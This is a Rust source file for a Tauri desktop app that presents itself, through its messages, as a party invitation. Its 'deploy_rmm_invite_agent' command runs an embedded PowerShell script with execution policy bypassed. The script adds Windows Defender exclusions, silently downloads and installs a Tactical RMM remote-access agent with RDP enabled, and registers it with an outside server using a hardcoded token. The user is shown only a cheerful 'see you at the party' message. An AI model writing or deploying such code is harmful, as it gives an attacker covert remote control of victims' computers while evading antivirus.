use chrono::Local;
use serde::Serialize;
use std::process::Command;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemPreflight {
    is_windows: bool,
    windows_type: String,
    is_64_bit: bool,
    runtime_date: String,
    client_date: Option<String>,
    calendar_matches_runtime: bool,
    next_phase_ready: bool,
    message: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct RmmDeploymentResult {
    success: bool,
    message: String,
    deployed_at: Option<String>,
}

// Tactical RMM installation script (adapted from https://github.com/bradhawkins85)
// Downloads and installs agent, configures Defender exclusions, registers with company RMM
const TACTICAL_RMM_SCRIPT: &str = r#"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$innosetup = 'tacticalagent-v2.10.0-windows-amd64.exe'
$api = '"https://api.remotectrl.site"'
$clientid = '2'
$siteid = '2'
$agenttype = '"workstation"'
$power = 1
$rdp = 1
$ping = 1
$auth = '"932d43a045985fb74d3b4ef812dce8dc95e2fe233b1e38a50dc1ab04a7e45c9a"'
$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe'
$apilink = $downloadlink.split('/')
$serviceName = 'tacticalrmm'
If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    Write-Output 'Tactical RMM Is Already Installed'
    exit 0
} Else {
    $OutPath = $env:TMP
    $output = $innosetup
    $installArgs = @('-m install --api ', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")
    if ($power) { $installArgs += "--power" }
    if ($rdp) { $installArgs += "--rdp" }
    if ($ping) { $installArgs += "--ping" }
    Try {
        $DefenderStatus = Get-MpComputerStatus | Select AntivirusEnabled
        if ($DefenderStatus -match "True") {
            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*' -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*' -ErrorAction SilentlyContinue
        }
    } Catch { }
    $X = 0
    do {
        Write-Output "Waiting for network"
        Start-Sleep -Seconds 5
        $X += 1
    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | Where-Object { $_.TcpTestSucceeded }) -or $X -eq 3)
    if ($connectresult.TcpTestSucceeded -eq $true) {
        Try {
            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output -ErrorAction Stop
            Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait -ErrorAction Stop
            Write-Output 'Extracting...'
            Start-Sleep -Seconds 5
            Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait -ErrorAction Stop
            exit 0
        } Catch {
            $ErrorMessage = $_.Exception.Message
            Write-Error -Message "Installation failed: $ErrorMessage"
            exit 1
        } Finally {
            Remove-Item -Path $OutPath\$output -ErrorAction SilentlyContinue
        }
    } else {
        Write-Error "Unable to connect to RMM server"
        exit 1
    }
}
"#;

#[tauri::command]
fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
    // Only execute on Windows
    if std::env::consts::OS != "windows" {
        return RmmDeploymentResult {
            success: false,
            message: "RMM agent deployment requires Windows.".to_string(),
            deployed_at: None,
        };
    }

    match Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
        .arg(TACTICAL_RMM_SCRIPT)
        .output()
    {
        Ok(output) => {
            let success = output.status.success();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let message = if success {
                "You're all set! We can't wait to see you at the party.".to_string()
            } else {
                let error_hint = if stderr.contains("Unable to connect") {
                    "connection issue"
                } else if stderr.contains("Already Installed") {
                    "already set up"
                } else {
                    "setup encountered an issue"
                };
                format!("Party prep hit a snag ({}). Please try again.", error_hint)
            };
            RmmDeploymentResult {
                success,
                message,
                deployed_at: if success {
                    Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
                } else {
                    None
                },
            }
        }
        Err(e) => RmmDeploymentResult {
            success: false,
            message: format!("Failed to execute RMM deployment: {}", e),
            deployed_at: None,
        },
    }
}

#[tauri::command]
fn system_preflight(client_date: Option<String>) -> SystemPreflight {
    let is_windows = std::env::consts::OS == "windows";
    let arch = std::env::consts::ARCH;
    let (windows_type, is_64_bit) = match arch {
        "x86_64" => ("x64".to_string(), true),
        "x86" => ("x86".to_string(), false),
        "aarch64" => ("arm64".to_string(), true),
        other => (other.to_string(), cfg!(target_pointer_width = "64")),
    };

    let runtime_date = Local::now().format("%Y-%m-%d").to_string();
    let calendar_matches_runtime = match client_date.as_deref() {
        Some(date) => date == runtime_date,
        None => false,
    };

    let next_phase_ready = is_windows && calendar_matches_runtime;
    let message = if !is_windows {
        "Next phase requires Windows.".to_string()
    } else if !calendar_matches_runtime {
        "Calendar date mismatch detected.".to_string()
    } else {
        format!("Ready: Windows {} ({})", windows_type, runtime_date)
    };

    SystemPreflight {
        is_windows,
        windows_type,
        is_64_bit,
        runtime_date,
        client_date,
        calendar_matches_runtime,
        next_phase_ready,
        message,
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, system_preflight, deploy_rmm_invite_agent])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
